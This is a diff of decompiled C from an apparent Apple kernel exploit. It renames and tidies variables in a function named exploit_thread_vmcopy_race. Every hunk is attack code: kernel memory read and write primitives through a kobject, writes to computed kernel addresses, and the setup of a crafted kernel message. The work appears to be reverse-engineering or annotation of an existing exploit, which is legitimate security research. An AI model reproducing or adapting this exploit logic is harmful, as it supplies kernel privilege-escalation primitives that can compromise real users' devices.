@@ -10653,21 +10653,7 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 a1)
   semaphore_t semaphore; // [xsp+364h] [xbp-39Ch] BYREF
   thread_act_t v162; // [xsp+368h] [xbp-398h] BYREF
   thread_act_t child_act; // [xsp+36Ch] [xbp-394h] BYREF
-  __int128 v164; // [xsp+370h] [xbp-390h] BYREF
-  __int128 v165; // [xsp+380h] [xbp-380h]
-  __int128 v166; // [xsp+390h] [xbp-370h]
-  __int128 v167; // [xsp+3A0h] [xbp-360h]
-  __int128 v168; // [xsp+3B0h] [xbp-350h]
-  __int128 v169; // [xsp+3C0h] [xbp-340h]
-  __int128 v170; // [xsp+3D0h] [xbp-330h]
-  __int128 v171; // [xsp+3E0h] [xbp-320h]
-  __int128 v172; // [xsp+3F0h] [xbp-310h]
-  __int128 v173; // [xsp+400h] [xbp-300h]
-  __int128 v174; // [xsp+410h] [xbp-2F0h]
-  __int128 v175; // [xsp+420h] [xbp-2E0h]
-  __int128 v176; // [xsp+430h] [xbp-2D0h]
-  __int128 v177; // [xsp+440h] [xbp-2C0h]
-  __int128 v178; // [xsp+450h] [xbp-2B0h]
+  uint64_t pageInfoPayload[30]; // [xsp+370h] [xbp-390h] BYREF
   __int128 __dst[19]; // [xsp+460h] [xbp-2A0h] BYREF
   __int128 v180[16]; // [xsp+590h] [xbp-170h] BYREF
 
@@ -11103,17 +11089,15 @@ LABEL_68:
     v87 = *(uint64_t *)(a1 + 360) & 0xFFFFFFFFFFFFC000LL;
     v88 = *(uint64_t *)(a1 + 360) & 0x3FFFLL;
     v110 = 0;
-    v164 = 0u;
-    v165 = 0u;
-    kread_via_kobject(*(uint64_t *)(a1 + 8), v103, (__int64)&v164, 32);
-    HIDWORD(v164) = *(uint64_t *)(a1 + 32);
-    kwrite_u64_via_kobject(*(uint64_t *)(a1 + 8), v103, (__int64)&v164, 32);
+    memset(pageInfoPayload, 0, 32);
+    kread_via_kobject(*(uint64_t *)(a1 + 8), v103, (__int64)pageInfoPayload, 32);
+    ((uint32_t *)pageInfoPayload)[3] = *(uint64_t *)(a1 + 32);
+    kwrite_u64_via_kobject(*(uint64_t *)(a1 + 8), v103, (__int64)pageInfoPayload, 32);
     vm_map(mach_task_self_, &v110, 0x4000u, 0, 1, object_handle, v87, 0, 3, 3, 1u);
-    v164 = 0u;
-    v165 = 0u;
-    kread_via_kobject(*(uint64_t *)(a1 + 8), v103, (__int64)&v164, 32);
-    HIDWORD(v164) = v102 >> v159;
-    kwrite_u64_via_kobject(*(uint64_t *)(a1 + 8), v103, (__int64)&v164, 32);
+    memset(pageInfoPayload, 0, 32);
+    kread_via_kobject(*(uint64_t *)(a1 + 8), v103, (__int64)pageInfoPayload, 32);
+    ((uint32_t *)pageInfoPayload)[3] = v102 >> v159;
+    kwrite_u64_via_kobject(*(uint64_t *)(a1 + 8), v103, (__int64)pageInfoPayload, 32);
     v89 = v110 + v88;
     *(uint64_t *)(a1 + 352) = v110 + v88;
     *(uint64_t *)(v89 + 264) = 1094795585;
@@ -11121,22 +11105,8 @@ LABEL_68:
     *(uint64_t *)(v89 + 248) = 1111638594;
     *(__int128 *)(v89 + 136) = xmmword_42F20;
     setup_kernel_exploit_msg(a1, *(uint64_t *)(a1 + 360), 1094795585, 0, 1111638594, 1128481603, 1145324612);
-    v178 = 0u;
-    v177 = 0u;
-    v176 = 0u;
-    v175 = 0u;
-    v174 = 0u;
-    v172 = 0u;
-    v173 = 0u;
-    v170 = 0u;
-    v171 = 0u;
-    v168 = 0u;
-    v169 = 0u;
-    v166 = 0u;
-    v167 = 0u;
-    v164 = 0u;
-    v165 = 0u;
-    query_phys_page_info(a1, qword_48040, (__int64)&v164);
+    memset(pageInfoPayload, 0, sizeof(pageInfoPayload));
+    query_phys_page_info(a1, qword_48040, (__int64)pageInfoPayload);
     kwrite_u64_to_addr(*(uint64_t *)(a1 + 8), *(uint64_t *)(a1 + 664) + 61448LL, *(uint64_t *)(a1 + 664) + 61408LL);
     v90 = *(uint64_t *)(a1 + 8);
     v91 = *(uint64_t *)(a1 + 664) + 61456LL;
